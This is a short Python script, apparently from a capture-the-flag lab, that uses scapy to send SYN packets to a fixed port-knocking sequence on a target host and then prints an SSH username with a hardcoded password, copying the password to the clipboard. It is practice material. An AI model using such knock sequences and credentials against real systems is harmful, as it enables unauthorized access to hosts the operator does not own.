#!/usr/bin/env python

from scapy.all import *
import pyperclip

def SendSyn(ip, port):
    ip=IP(src="10.10.16.8", dst=ip)
    SYN=TCP(sport=7777, dport=port, flags="S", seq=12345)
    send(ip/SYN)

ports = [3456, 8234, 62431]

for port in ports:
    SendSyn("10.129.147.242", port)

print("[+] Portal should be open.\nRun:\nssh prometheus@10.129.147.242\npassword: St34l_th3_F1re!")
print("[*] Putting password on system clipboard. Ctrl + Shift + v to paste")
pyperclip.copy('St34l_th3_F1re!\n')
